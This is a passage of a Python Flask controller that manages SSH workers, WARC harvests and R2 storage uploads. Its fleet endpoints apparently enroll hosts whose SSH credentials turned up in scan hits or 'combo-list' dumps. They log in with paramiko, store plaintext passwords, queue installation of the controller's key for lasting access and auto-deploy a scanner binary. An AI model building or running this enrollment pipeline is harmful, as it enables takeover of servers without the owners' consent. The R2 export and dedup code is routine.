            with _warc_lock:
                # Only stamp if no other request finalized first.
                if _warc_state.get('finished_at') is None:
                    _warc_state['finished_at'] = datetime.now().isoformat()
                    _warc_state['last_exit_code'] = 0  # remote exit code unavailable; treat clean exit as success
                    if r2_key_done:
                        _warc_state['r2_key'] = r2_key_done
                        _warc_state['r2_uploaded_at'] = datetime.now().isoformat()
                        _warc_state['r2_error'] = None
                    else:
                        _warc_state['r2_error'] = r2_err_done
                state = dict(_warc_state)
            _save_warc_state()
    else:
        # ── Controller path: original local file/Popen probes ─────────
        running = proc is not None and proc.poll() is None
        if output_path and os.path.exists(output_path):
            try:
                with open(output_path, 'rb') as f:
                    buf = f.read(1024 * 1024 * 8)  # cap at 8 MiB sample
                    domains_found = buf.count(b'\n')
            except Exception:
                pass
        if log_path and os.path.exists(log_path):
            try:
                with open(log_path, 'rb') as f:
                    f.seek(0, 2)
                    size = f.tell()
                    f.seek(max(0, size - 4096))
                    log_tail = [
                        ln for ln in f.read().decode('utf-8', errors='replace').splitlines()
                        if ln.strip()
                    ][-20:]
            except Exception:
                pass

    return jsonify({
        'running': running,
        'pid': state.get('pid'),
        'run_id': state.get('run_id'),
        'run_on': run_on,
        'remote_pid': state.get('remote_pid'),
        'started_at': state.get('started_at'),
        'finished_at': state.get('finished_at'),
        'max_domains': state.get('max_domains'),
        'domains_found': domains_found,
        'last_exit_code': state.get('last_exit_code'),
        'r2_key': state.get('r2_key'),
        'r2_uploaded_at': state.get('r2_uploaded_at'),
        'r2_error': state.get('r2_error'),
        'log_tail': _truncate_log_tail(log_tail),
    })


def _warc_remote_export_to_r2(ip: str, remote_output_path: str,
                              run_id: 'str | None',
                              content_sha: 'str | None' = None) -> 'tuple[str | None, str | None]':
    """Push the worker's live_domains.txt directly to R2 via a presigned
    PUT URL — the file never round-trips through the controller. Returns
    (r2_key, error_string). Either may be None.

    When ``content_sha`` is provided we use a content-addressed key so a
    repeat upload of byte-identical content lands at the same place. The
    presigned URL is bound to that exact key, so a presigning round-trip
    can't accidentally write to a different one."""
    if not remote_output_path:
        return None, 'no remote output path in state'
    client, bucket, state, err = _get_r2_client()
    if not client or not bucket:
        return None, err or f'R2 unavailable ({state})'
    r2_key = _content_addressed_key(content_sha)
    if not r2_key:
        ts = datetime.now().strftime('%Y%m%dT%H%M%SZ')
        r2_key = f'warc/live_domains_{ts}_{run_id or "manual"}.txt'
    presign_params = {'Bucket': bucket, 'Key': r2_key, 'ContentType': 'text/plain'}
    if content_sha:
        # Forwarding the metadata header at presign time means the
        # worker's curl PUT carries the sha into the stored object's
        # metadata — no extra round-trip from the controller.
        presign_params['Metadata'] = {'sha256': content_sha}
    try:
        url = client.generate_presigned_url(
            'put_object',
            Params=presign_params,
            ExpiresIn=3600,
        )
    except Exception as e:
        return None, f'presign failed: {e}'

    mgr = get_ssh_manager()
    if mgr is None:
        return None, 'SSH manager unavailable'

    # Single-quote-escape: replace ' with '\'' so we can safely wrap the URL
    # in single quotes for the remote shell.
    safe_url = url.replace("'", "'\\''")
    # `--fail` (-f) flips curl's exit code on HTTP 4xx/5xx; `--silent --show-error`
    # keeps the log readable. The trailing `&& echo OK` makes the success path
    # unambiguous over an SSH stdout that strips return codes. When we
    # presigned with Metadata={'sha256': ...} R2 verifies the matching
    # `x-amz-meta-sha256` header against the signature, so curl must send
    # it back unchanged.
    meta_header = f" -H 'x-amz-meta-sha256: {content_sha}'" if content_sha else ''
    cmd = (
        f"curl -fsS -X PUT --upload-file {remote_output_path} "
        f"-H 'Content-Type: text/plain'{meta_header} '{safe_url}' && echo OK"
    )
    out = mgr.ssh_exec(ip, cmd, 120)
    if (out or '').strip().endswith('OK'):
        return r2_key, None
    return None, f'remote curl upload failed: {out!r}'


def _content_addressed_key(sha256: 'str | None') -> 'str | None':
    """Canonical R2 key for a given content hash. Pinning the hash into the
    key path turns the bucket itself into the dedup index — same content
    always lands at the same key, no matter what client wrote it. The
    16-char prefix gives a 64-bit keyspace, more than enough at fleet
    scale, while staying readable in the cockpit listing."""
    if not sha256 or len(sha256) < 16:
        return None
    return f'warc/by-content/live_domains_{sha256[:16]}.txt'


def _r2_head(key: str) -> 'dict | None':
    """HEAD an R2 object. Returns the response dict on hit, None on miss
    or any error. Lets the upload path probe "does this content already
    exist?" with one cheap API call, independent of our local pointer."""
    client, bucket, _state, _err = _get_r2_client()
    if not client or not bucket or not key:
        return None
    try:
        return client.head_object(Bucket=bucket, Key=key)
    except Exception:
        return None


def _sha256_local(path: str) -> 'str | None':
    """SHA-256 of a controller-side file, streamed so a huge harvest output
    doesn't load into RAM. Returns None on any read failure."""
    try:
        import hashlib as _h
        h = _h.sha256()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(65536), b''):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return None


def _sha256_remote(mgr, ip: str, remote_path: str) -> 'str | None':
    """SHA-256 of a worker-side file via one ssh_exec. Returns None if the
    file is missing or sha256sum isn't on $PATH."""
    if mgr is None or not remote_path:
        return None
    raw = mgr.ssh_exec(ip, f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'", 10) or ''
    s = raw.strip()
    return s if len(s) == 64 and all(c in '0123456789abcdef' for c in s) else None


@app.route('/api/warc/export-to-r2', methods=['POST'])
def api_warc_export_to_r2():
    """Force-upload the current live_domains.txt to R2 even if the run
    hasn't finished yet. Useful for taking a snapshot mid-harvest.

    Content-addressed dedup: we hash the file before uploading and stash
    `r2_last_export_sha` + `r2_last_export_key` in warc_state. A second
    click while the file is byte-identical short-circuits with HTTP 200
    + `{noop: true, r2_key}` instead of creating a duplicate object. This
    is why your bucket was accumulating identical 177 KB exports."""
    _reload_warc_state_if_changed()
    with _warc_lock:
        output_path = _warc_state.get('output_path')
        run_id = _warc_state.get('run_id')
        run_on = _warc_state.get('run_on') or 'controller'
        last_sha = _warc_state.get('r2_last_export_sha')
        last_key = _warc_state.get('r2_last_export_key')

    # ── Worker path: worker pushes directly to R2 ─────────────────────
    if run_on != 'controller':
        if not output_path:
            return jsonify({'error': 'no warc output to export'}), 404
        mgr = get_ssh_manager()
        cur_sha = _sha256_remote(mgr, run_on, output_path)
        # Fast path: dedup pointer matches.
        if cur_sha and last_sha and cur_sha == last_sha and last_key:
            with _warc_lock:
                _warc_state['r2_key'] = last_key
                _warc_state['r2_error'] = None
            _save_warc_state()
            return jsonify({
                'success': True, 'noop': True, 'r2_key': last_key,
                'message': 'content unchanged — reusing existing R2 object',
                'sha256': cur_sha,
            })
        # Slow-but-correct path: ask the bucket. Content-addressed key
        # means we can probe with one HEAD; if it exists, the content is
        # already there regardless of whether our local pointer remembers
        # it (state wipes, second worker, manual upload, etc.).
        ck = _content_addressed_key(cur_sha) if cur_sha else None
        if ck:
            existing = _r2_head(ck)
            if existing is not None:
                with _warc_lock:
                    _warc_state['r2_key'] = ck
                    _warc_state['r2_error'] = None
                    _warc_state['r2_last_export_sha'] = cur_sha
                    _warc_state['r2_last_export_key'] = ck
                _save_warc_state()
                return jsonify({
                    'success': True, 'noop': True, 'r2_key': ck,
                    'message': 'content already in R2 at content-addressed key',
                    'sha256': cur_sha,
                })
        r2_key, err = _warc_remote_export_to_r2(run_on, output_path, run_id, content_sha=cur_sha)
        if not r2_key:
            return jsonify({'error': err or 'R2 upload failed'}), 502
        with _warc_lock:
            _warc_state['r2_key'] = r2_key
            _warc_state['r2_uploaded_at'] = datetime.now().isoformat()
            _warc_state['r2_error'] = None
            if cur_sha:
                _warc_state['r2_last_export_sha'] = cur_sha
                _warc_state['r2_last_export_key'] = r2_key
        _save_warc_state()
        return jsonify({'success': True, 'r2_key': r2_key, 'run_on': run_on, 'sha256': cur_sha})

    # ── Controller path: legacy boto3 upload from local disk ──────────
    if not output_path or not os.path.exists(output_path):
        return jsonify({'error': 'no warc output to export'}), 404
    cur_sha = _sha256_local(output_path)
    # Fast path — pointer match.
    if cur_sha and last_sha and cur_sha == last_sha and last_key:
        with _warc_lock:
            _warc_state['r2_key'] = last_key
            _warc_state['r2_error'] = None
        _save_warc_state()
        return jsonify({
            'success': True, 'noop': True, 'r2_key': last_key,
            'message': 'content unchanged — reusing existing R2 object',
            'sha256': cur_sha,
        })
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'error': err or f'R2 unavailable ({state})'}), 503
    # Slow path — content-addressed key. Same hash always lands at the
    # same key. A second click while state is wiped, a sibling controller,
    # or an out-of-band re-upload all funnel into the same object.
    r2_key = _content_addressed_key(cur_sha) if cur_sha else None
    if r2_key:
        existing = _r2_head(r2_key)
        if existing is not None:
            with _warc_lock:
                _warc_state['r2_key'] = r2_key
                _warc_state['r2_error'] = None
                _warc_state['r2_last_export_sha'] = cur_sha
                _warc_state['r2_last_export_key'] = r2_key
            _save_warc_state()
            return jsonify({
                'success': True, 'noop': True, 'r2_key': r2_key,
                'message': 'content already in R2 at content-addressed key',
                'sha256': cur_sha,
            })
    if not r2_key:
        # No hash available (read failed). Fall back to timestamp-based
        # key so the operator still gets *some* upload, even if dedup is
        # disabled for this one run.
        ts = datetime.now().strftime('%Y%m%dT%H%M%SZ')
        r2_key = f'warc/live_domains_{ts}_{run_id or "manual"}.txt'
    try:
        extra = {'ContentType': 'text/plain'}
        if cur_sha:
            # Stamp the full sha as object metadata for traceability — lets
            # a third party verify content from object alone, and lets us
            # rebuild a dedup index later by scanning metadata.
            extra['Metadata'] = {'sha256': cur_sha}
        client.upload_file(output_path, bucket, r2_key, ExtraArgs=extra)
    except Exception as e:
        return jsonify({'error': f'R2 upload failed: {e}'}), 500
    with _warc_lock:
        _warc_state['r2_key'] = r2_key
        _warc_state['r2_uploaded_at'] = datetime.now().isoformat()
        _warc_state['r2_error'] = None
        if cur_sha:
            _warc_state['r2_last_export_sha'] = cur_sha
            _warc_state['r2_last_export_key'] = r2_key
    _save_warc_state()
    return jsonify({'success': True, 'r2_key': r2_key, 'sha256': cur_sha})


@app.route('/api/r2/objects', methods=['GET'])
def api_r2_objects():
    """List objects in the configured R2 bucket. Optional ?prefix=warc/.

    Returns `{ok, objects: [{key, size, modified, storage_class}]}`. The
    dashboard renders this as a deletable list so the operator can prune
    duplicates without leaving the cockpit."""
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'ok': False, 'error': err or f'R2 unavailable ({state})'}), 503
    prefix = request.args.get('prefix', '')
    try:
        max_keys = max(1, min(1000, int(request.args.get('limit') or 100)))
    except (TypeError, ValueError):
        max_keys = 100
    objects = []
    try:
        kwargs = {'Bucket': bucket, 'MaxKeys': max_keys}
        if prefix:
            kwargs['Prefix'] = prefix
        resp = client.list_objects_v2(**kwargs)
        for o in resp.get('Contents', []) or []:
            objects.append({
                'key': o.get('Key'),
                'size': o.get('Size', 0),
                'modified': (o.get('LastModified').isoformat()
                             if o.get('LastModified') else None),
                'storage_class': o.get('StorageClass'),
            })
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500
    objects.sort(key=lambda x: x.get('modified') or '', reverse=True)
    return jsonify({'ok': True, 'bucket': bucket, 'prefix': prefix, 'objects': objects})


@app.route('/api/r2/cors-setup', methods=['POST'])
def api_r2_cors_setup():
    """One-click CORS rule install for the configured bucket.

    Without this, browser-direct PUTs from the Lists panel fail with the
    opaque "R2 PUT network error" (which is what XMLHttpRequest reports
    when a CORS preflight is blocked). Operators shouldn't have to paste
    JSON into the Cloudflare dashboard — they click a button here and the
    rule lands.

    Sets a permissive but bounded policy: PUT/GET/HEAD from any origin,
    short max-age so updates propagate quickly, ETag exposed so multipart
    flows can verify upload integrity. Refuses to widen further (no DELETE,
    no wildcard headers) so a misclick can't accidentally open the bucket
    up to cross-origin DELETE attacks."""
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'ok': False, 'error': err or f'R2 unavailable ({state})'}), 503
    cors_rules = {
        'CORSRules': [{
            'AllowedOrigins': ['*'],
            'AllowedMethods': ['PUT', 'GET', 'HEAD'],
            'AllowedHeaders': ['Content-Type', 'Content-MD5', 'x-amz-*'],
            'ExposeHeaders': ['ETag'],
            'MaxAgeSeconds': 300,
        }],
    }
    try:
        client.put_bucket_cors(Bucket=bucket, CORSConfiguration=cors_rules)
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500
    return jsonify({'ok': True, 'bucket': bucket, 'rules': cors_rules['CORSRules']})


@app.route('/api/r2/object', methods=['DELETE'])
def api_r2_object_delete():
    """Delete a single object by exact key (passed as ?key=warc/...).

    Refuses to delete an empty key as a guard against client bugs that
    would otherwise list_objects + delete the bucket root."""
    key = request.args.get('key') or ''
    if not key.strip():
        return jsonify({'ok': False, 'error': 'key required'}), 400
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'ok': False, 'error': err or f'R2 unavailable ({state})'}), 503
    try:
        client.delete_object(Bucket=bucket, Key=key)
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500
    # If the operator just nuked the row we have remembered as the
    # dedup target, clear the dedup pointer so the next export uploads
    # fresh instead of returning a 404'd r2_key as a "noop".
    with _warc_lock:
        if _warc_state.get('r2_last_export_key') == key:
            _warc_state.pop('r2_last_export_sha', None)
            _warc_state.pop('r2_last_export_key', None)
        if _warc_state.get('r2_key') == key:
            _warc_state['r2_key'] = None
            _warc_state['r2_uploaded_at'] = None
    _save_warc_state()
    return jsonify({'ok': True, 'deleted': key})


@app.route('/api/warc/hosts', methods=['GET'])
def api_warc_hosts():
    """Roster of hosts the dashboard can target for WARC harvests.
    Always includes the controller; remaining entries are workers whose
    operator-assigned role is 'warc' so the WARC dropdown can't
    accidentally launch a harvest on a scanner box."""
    mgr = get_ssh_manager()
    roster = mgr.load_servers() if mgr is not None else []
    creds = _load_fleet_creds()
    warc_ips = [ip for ip in roster if (creds.get(ip) or {}).get('role') == 'warc']
    return jsonify({'hosts': ['controller', *warc_ips]})


# ==================== SSH BULK CREDS ====================

# Persisted per-worker connection info: maps `ip → {user, port, auth_kind}`.
# SSHManager reads this so it knows to log into a worker as the user that
# actually owns the installed authorized_keys (often non-root) instead of
# always falling back to the controller-wide remote_user default.
FLEET_CREDS_FILE = 'fleet_creds.json'


def _load_fleet_creds() -> dict:
    if not os.path.exists(FLEET_CREDS_FILE):
        return {}
    try:
        with open(FLEET_CREDS_FILE, 'r') as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _save_fleet_creds(creds: dict) -> None:
    try:
        with open(FLEET_CREDS_FILE, 'w') as f:
            json.dump(creds, f, indent=2)
        # Sidecar now holds plaintext passwords; lock it down so other
        # users on the controller can't read them.
        try:
            os.chmod(FLEET_CREDS_FILE, 0o600)
        except OSError:
            pass
    except Exception:
        pass


def _remember_worker(host: str, port: int, user: str, auth_kind: str,
                     password: str | None = None,
                     label: str | None = None,
                     role: str | None = None) -> None:
    """Idempotent update of the fleet_creds.json sidecar.

    When ``password`` is provided we persist it under the ``password`` key
    so ssh_manager can fall back to password auth if the controller's
    pubkey gets wiped (cloud-init, fail2ban, manual rebuild). When
    ``password`` is None we carry forward any previously-stored password
    instead of clobbering it — re-running a key-auth row must not erase
    the password we already learned for that host.

    ``label`` and ``role`` follow the same carry-forward semantics so
    operator-chosen friendly names and the warc/scanner role tag survive
    every re-probe. Default role is 'scanner' when nothing has ever been
    set."""
    creds = _load_fleet_creds()
    existing = creds.get(host) or {}
    creds[host] = {
        'user': user or existing.get('user') or 'root',
        'port': int(port or existing.get('port') or 22),
        'auth_kind': auth_kind or existing.get('auth_kind') or 'key',
    }
    # Password handling: explicit value wins, otherwise carry forward.
    if password:
        creds[host]['password'] = password
    elif existing.get('password'):
        creds[host]['password'] = existing['password']
    # Label: explicit value wins, otherwise carry forward an existing one.
    if label is not None:
        creds[host]['label'] = str(label)[:80]
    elif 'label' in existing:
        creds[host]['label'] = existing['label']
    # Role: explicit value wins (validated by caller), otherwise carry
    # forward; default to 'scanner' only when nothing exists.
    if role in ('scanner', 'warc'):
        creds[host]['role'] = role
    elif existing.get('role') in ('scanner', 'warc'):
        creds[host]['role'] = existing['role']
    else:
        creds[host]['role'] = 'scanner'
    # Carry forward spec/batch fields populated by the SSH probe so we
    # never clobber them on re-key.
    for k in ('cpu', 'ram_gb', 'disk_gb', 'batch_size', 'scanner_deployed_at'):
        if k in existing:
            creds[host][k] = existing[k]
    _save_fleet_creds(creds)


def _get_fleet_config() -> dict:
    """Read the fleet block out of config.json with a sane default. Used by
    the auto-deploy toggle and any future fleet-wide settings."""
    cfg = _load_scanner_config()
    return cfg.get('fleet') or {'auto_deploy': True}


def _set_fleet_config(new: dict) -> None:
    cfg = _load_scanner_config()
    cfg['fleet'] = {**(cfg.get('fleet') or {}), **new}
    with open(SCANNER_CONFIG_PATH, 'w') as f:
        json.dump(cfg, f, indent=2)


# Cap simultaneous auto-deploy bootstraps. Each bootstrap pegs a gunicorn
# worker on SFTP + remote installs for tens of seconds; with only 2
# gunicorn workers in production, more than 2 concurrent installs starves
# the dashboard and surfaces as 502s. Two is the safe ceiling.
_AUTO_DEPLOY_SEMAPHORE = threading.Semaphore(2)

# Serialize operator-driven writes to fleet_creds.json so a label change and a
# role change on the same worker (or two label changes from a double-click)
# don't read-modify-write over each other. Other callers — _remember_worker,
# _persist_specs_if_new — are idempotent spec-capture paths, so the read-then-
# write race there is acceptable; only the dashboard-driven label/role routes
# need this lock.
_FLEET_CREDS_WRITE_LOCK = threading.Lock()


def _auto_deploy_one(ip: str) -> None:
    """Fire-and-forget bootstrap of a single worker: pushes the scanner
    binary + main.py + work_dir prep, no target list, no scan kick-off.
    Stamps scanner_deployed_at only when the SFTP and chmod succeeded.

    Guarded by ``_AUTO_DEPLOY_SEMAPHORE`` so a roster import that adds 20
    hosts at once doesn't fire 20 simultaneous bootstraps and 502 the
    dashboard."""
    _AUTO_DEPLOY_SEMAPHORE.acquire()
    try:
        mgr = get_ssh_manager()
        if not mgr:
            return
        # Warc-dedicated workers don't get the scanner binary — they exist
        # solely to run wget/wpull harvests against operator-supplied URL
        # lists, and pushing the scanner over SFTP would just waste disk
        # and risk a stray cron run.
        creds = _load_fleet_creds()
        if (creds.get(ip) or {}).get('role') == 'warc':
            return
        result = mgr.bootstrap_worker(ip)
        if not result.get('success'):
            print(f'[auto-deploy] {ip} bootstrap failed: {result.get("message")}')
            return
        creds = _load_fleet_creds()
        if ip in creds:
            creds[ip]['scanner_deployed_at'] = datetime.now().isoformat()
            _save_fleet_creds(creds)
    except Exception as e:
        print(f'[auto-deploy] {ip} failed: {e}')
    finally:
        _AUTO_DEPLOY_SEMAPHORE.release()


def _tcp_reachable(host: str, port: int, timeout: float = 2.0):
    """Quick TCP-level reachability probe — returns (ok, message).

    Lets the bulk-creds / install-keys endpoints fast-fail a host whose
    sshd isn't listening, instead of burning paramiko's full
    banner/auth-timeout budget. The message is human-readable so it can
    go straight into the per-row status table."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True, ''
    except socket.timeout:
        return False, f'TCP timeout — no response from port {port} in {timeout:g}s'
    except socket.gaierror as e:
        return False, f'DNS resolution failed: {e}'
    except ConnectionRefusedError:
        return False, f'connection refused on port {port} (sshd not listening?)'
    except OSError as e:
        return False, f'TCP error: {e}'


_DELIM_PREFER = ('|', '\t', ';', ' ', ':')
_PEM_HEAD = '-----BEGIN'


def _looks_like_port(tok: str) -> bool:
    return tok.isdigit() and 1 <= int(tok) <= 65535


def _looks_like_key_material(secret: str) -> bool:
    s = secret.strip()
    if not s:
        return False
    if _PEM_HEAD in s:
        return True
    if s.startswith('/') or s.startswith('~/'):
        return True
    low = s.lower()
    return low.endswith('.pem') or low.endswith('.key')


def _pick_delim(rest: str) -> str:
    """Pick the most likely field delimiter for this line.

    Prefers pipe/tab/semicolon (which cannot appear in IPv4 or in
    legacy `host:port` forms) before colon and whitespace. Returns
    ':' as the last-resort default."""
    for d in _DELIM_PREFER:
        if d in rest:
            return d
    return ':'


def _parse_creds_text(text: str):
    """Parse a bulk-creds text blob. Returns list of dicts:
       {host, port, user, auth_kind, secret, raw}

    Accepts any of the common combo-list shapes — auto-detects the
    delimiter (pipe, tab, semicolon, whitespace, or colon) and the
    auth kind (password vs. private key). Examples:

       198.51.100.10                        # IP only, controller key + root
       root@198.51.100.10                   # explicit user, controller key
       deploy@host.example.com:2222         # user + non-default port
       1.2.3.4|root|password                # pipe combo (host|user|pass)
       1.2.3.4|2222|root|password           # pipe combo with port
       1.2.3.4:root:password                # colon combo, no auth marker
       1.2.3.4 root password                # whitespace combo
       1.2.3.4|root|/home/me/.ssh/id_ed25519  # secret looks like a path → key
       root@198.51.100.20:22:key:/path/to.pem # legacy: explicit key marker
       deploy@1.2.3.4:2222:password:s3cret    # legacy: explicit password marker
    """
    rows = []
    for raw in text.splitlines():
        s = raw.strip()
        if not s or s.startswith('#'):
            continue

        user = None
        # Pull off optional `user@` prefix — only when '@' comes before any
        # field delimiter, so e.g. an email-like password later in the line
        # is left alone.
        prefix = re.split(r'[|;\t :]', s, maxsplit=1)[0]
        if '@' in prefix:
            head, _, tail = s.partition('@')
            user = head.strip() or None
            rest = tail
        else:
            rest = s

        has_at_prefix = user is not None

        delim = _pick_delim(rest)
        if delim == ' ':
            parts = rest.split()
        else:
            parts = rest.split(delim)
        parts = [p for p in parts if p != '']
        if not parts:
            continue

        # Field 0 = host (may carry a `:port` suffix, e.g. `1.2.3.4:22|root|pw`).
        head_field = parts[0]
        port = 22
        if ':' in head_field and delim != ':':
            hp = head_field.split(':')
            if len(hp) == 2 and _looks_like_port(hp[1]):
                host = hp[0]
                port = int(hp[1])
            else:
                host = head_field
        else:
            host = head_field
        host = host.strip()

        idx = 1
        if idx < len(parts) and _looks_like_port(parts[idx]):
            port = int(parts[idx])
            idx += 1

        if user is None and idx < len(parts):
            user = parts[idx].strip()
            idx += 1
        if not user:
            user = 'root'

        auth_kind = None
        # Legacy explicit marker — only honor it when `user@` was given AND
        # there's still a secret after the marker. Otherwise a literal
        # password/key string would be mis-treated as a marker.
        if (has_at_prefix and idx + 1 < len(parts)
                and parts[idx].lower() in ('key', 'password')):
            auth_kind = parts[idx].lower()
            idx += 1

        if idx < len(parts):
            join = delim if delim != ' ' else ' '
            secret = join.join(parts[idx:]).strip()
        else:
            secret = ''

        if auth_kind is None:
            if not secret:
                auth_kind = 'key'  # fall back to controller default key
            elif _looks_like_key_material(secret):
                auth_kind = 'key'
            else:
                auth_kind = 'password'

        if not host:
            continue
        rows.append({'host': host, 'port': port, 'user': user,
                     'auth_kind': auth_kind, 'secret': secret, 'raw': s})
    return rows


@app.route('/api/fleet/bulk-creds', methods=['POST'])
def api_fleet_bulk_creds():
    """Parse + test a batch of SSH credentials. Body: either form-file 'file'
    or JSON {"text": "..."} or JSON {"creds": [{host,port,user,auth_kind,secret}, ...]}.
    Returns per-row {ok, message} after a quick paramiko connect."""
    try:
        import paramiko
    except ImportError:
        return jsonify({'error': 'paramiko not installed'}), 500

    body_text = ''
    if 'file' in request.files:
        body_text = request.files['file'].read().decode('utf-8', errors='ignore')
    elif request.is_json:
        data = request.json or {}
        if isinstance(data.get('text'), str):
            body_text = data['text']
        elif isinstance(data.get('creds'), list):
            # already structured — turn into per-row dicts directly
            rows = []
            for c in data['creds']:
                if not isinstance(c, dict) or not c.get('host'):
                    continue
                rows.append({
                    'host': str(c.get('host')),
                    'port': int(c.get('port') or 22),
                    'user': str(c.get('user') or 'root'),
                    'auth_kind': str(c.get('auth_kind') or 'key'),
                    'secret': str(c.get('secret') or ''),
                    'raw': str(c.get('host')),
                })
        else:
            return jsonify({'error': 'send "text" or "creds"'}), 400
    else:
        body_text = request.get_data(as_text=True) or ''

    if body_text:
        rows = _parse_creds_text(body_text)
    if not rows:
        return jsonify({'error': 'no valid credential rows parsed'}), 400

    results = []
    accepted_ips = []
    for r in rows:
        result = {'host': r['host'], 'port': r['port'], 'user': r['user'], 'ok': False, 'message': ''}
        # Cheap reachability gate first so dead hosts don't eat the full
        # paramiko banner-timeout budget per row.
        tcp_ok, tcp_err = _tcp_reachable(r['host'], r['port'], timeout=2.5)
        if not tcp_ok:
            result['message'] = tcp_err
            results.append(result)
            continue
        try:
            cli = paramiko.SSHClient()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            kwargs = {'hostname': r['host'], 'port': r['port'], 'username': r['user'], 'timeout': 6}
            if r['auth_kind'] == 'password':
                kwargs['password'] = r['secret']
            else:
                # key auth — accept either a path or fall back to controller default
                key_path = r['secret']
                if not key_path:
                    # fall back to the controller's fleet key
                    default = os.path.join(os.path.dirname(SCANNER_CONFIG_PATH), '..', '.ssh', 'id_ed25519')
                    if os.path.exists(default):
                        kwargs['key_filename'] = default
                else:
                    kwargs['key_filename'] = key_path
            cli.connect(**kwargs)
            cli.close()
            result['ok'] = True
            result['message'] = 'connected'
            accepted_ips.append(r['host'])
            # Remember the user/port that worked so ssh_manager doesn't
            # default to `root` when the worker only accepts `admin`.
            # For password rows, persist the secret so ssh_manager can
            # fall back to password auth if authorized_keys gets wiped.
            if r['auth_kind'] == 'password' and r['secret']:
                _remember_worker(r['host'], r['port'], r['user'], r['auth_kind'],
                                 password=r['secret'])
            else:
                _remember_worker(r['host'], r['port'], r['user'], r['auth_kind'])
        except Exception as e:
            result['message'] = str(e)
        results.append(result)

    # Append OK rows to server_ips.txt (idempotent — dedup against existing)
    server_ips = os.path.join('.', 'server_ips.txt')
    try:
        existing = set()
        if os.path.exists(server_ips):
            with open(server_ips, 'r') as f:
                existing = {ln.strip() for ln in f if ln.strip()}
        new_ips = [ip for ip in accepted_ips if ip not in existing]
        if new_ips:
            with open(server_ips, 'a') as f:
                for ip in new_ips:
                    f.write(ip + '\n')
    except Exception:
        pass

    return jsonify({
        'total': len(rows),
        'ok': sum(1 for r in results if r['ok']),
        'failed': sum(1 for r in results if not r['ok']),
        'results': results,
        'added_to_roster': len(accepted_ips),
    })


@app.route('/api/fleet/enroll', methods=['POST'])
def api_fleet_enroll():
    """Single-host enrollment endpoint used by `useFleetEnrollment` when a
    scan hit yields SSH credentials.

    Request body (camelCase per frontend convention):
        {host, port, user, secret, authType: 'key'|'password', vpsId}

    Behaviour mirrors a one-row /api/fleet/bulk-creds run:
      1. TCP reachability check (2.5 s)
      2. paramiko SSH connect with the supplied creds
      3. If OK: persist via _remember_worker(...) so ssh_manager uses these
         creds on its monitor cycle (and so _repair_keys_on_worker can
         install the controller pubkey in the background)
      4. Append host to server_ips.txt (idempotent dedup)
      5. Return {ok, message, hostname, region} — shape matches what
         `enrollSshViaApi` in dashboard/src/lib/fleetControl.ts expects.

    Returning 404 here was the smoking gun for "discovered hosts show live
    then flip OFFLINE immediately after add" — the frontend was POSTing to
    a route that simply wasn't registered, so every auto-enroll surfaced
    as a failure."""
    try:
        import paramiko
    except ImportError:
        return jsonify({'ok': False, 'message': 'paramiko not installed'}), 500

    data = request.get_json(force=True, silent=True) or {}
    host = str(data.get('host', '')).strip()
    if not host:
        return jsonify({'ok': False, 'message': 'host required'}), 400
    try:
        port = int(data.get('port') or 22)
    except (TypeError, ValueError):
        port = 22
    user = str(data.get('user') or 'root').strip() or 'root'
    secret = str(data.get('secret') or '')
    auth_type = str(data.get('authType') or 'key').lower()
    if auth_type not in ('key', 'password'):
        auth_type = 'key'

    tcp_ok, tcp_err = _tcp_reachable(host, port, timeout=2.5)
    if not tcp_ok:
        return jsonify({'ok': False, 'message': f'tcp: {tcp_err}'})

    hostname = None
    try:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kwargs = {'hostname': host, 'port': port, 'username': user, 'timeout': 6,
                  'banner_timeout': 6, 'auth_timeout': 6,
                  'allow_agent': False, 'look_for_keys': False}
        if auth_type == 'password':
            if not secret:
                return jsonify({'ok': False, 'message': 'password required'})
            kwargs['password'] = secret
        else:
            if secret:
                kwargs['key_filename'] = secret
            else:
                default = os.path.join(os.path.dirname(SCANNER_CONFIG_PATH),
                                       '..', '.ssh', 'id_ed25519')
                if os.path.exists(default):
                    kwargs['key_filename'] = default
        cli.connect(**kwargs)
        # Grab a hostname so the card label can show something nicer than
        # "disc-1.2.3.4". Failures here are non-fatal — the connect already
        # passed.
        try:
            _, stdout, _ = cli.exec_command('hostname -f 2>/dev/null || hostname', timeout=4)
            hostname = (stdout.read().decode('utf-8', errors='replace').strip() or None)
        except Exception:
            hostname = None
        cli.close()
    except Exception as e:
        return jsonify({'ok': False, 'message': f'ssh: {e}'})

    # SSH worked — persist creds so the monitor uses them, then append to
    # the roster. Password rows carry the secret so _repair_keys_on_worker
    # can install the controller pubkey on the next probe.
    if auth_type == 'password' and secret:
        _remember_worker(host, port, user, 'password', password=secret)
    else:
        _remember_worker(host, port, user, 'key')

    server_ips = os.path.join('.', 'server_ips.txt')
    try:
        existing = set()
        if os.path.exists(server_ips):
            with open(server_ips, 'r') as f:
                existing = {ln.strip() for ln in f if ln.strip()}
        if host not in existing:
            with open(server_ips, 'a') as f:
                f.write(host + '\n')
    except Exception:
        pass

    return jsonify({
        'ok': True,
        'message': 'SSH verified; pubkey install queued',
        'hostname': hostname,
        'region': None,
    })


# ──────────────────────────────────────────────────────────────────────────
# Fleet — install controller pubkey on password-auth workers
# ──────────────────────────────────────────────────────────────────────────


def _resolve_controller_pubkey() -> str:
    """Return the controller's SSH public key contents (single line, stripped).

    Looks at, in order:
      1. backend/ssh_config.json `ssh_key_path` + ".pub"
      2. <install_dir>/.ssh/id_ed25519.pub  (install-controller.sh layout)
      3. ~/.ssh/id_ed25519.pub  (developer fallback)

    Raises FileNotFoundError if none exist.
    """
    candidates = []
    cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ssh_config.json')
    try:
        if os.path.exists(cfg_path):
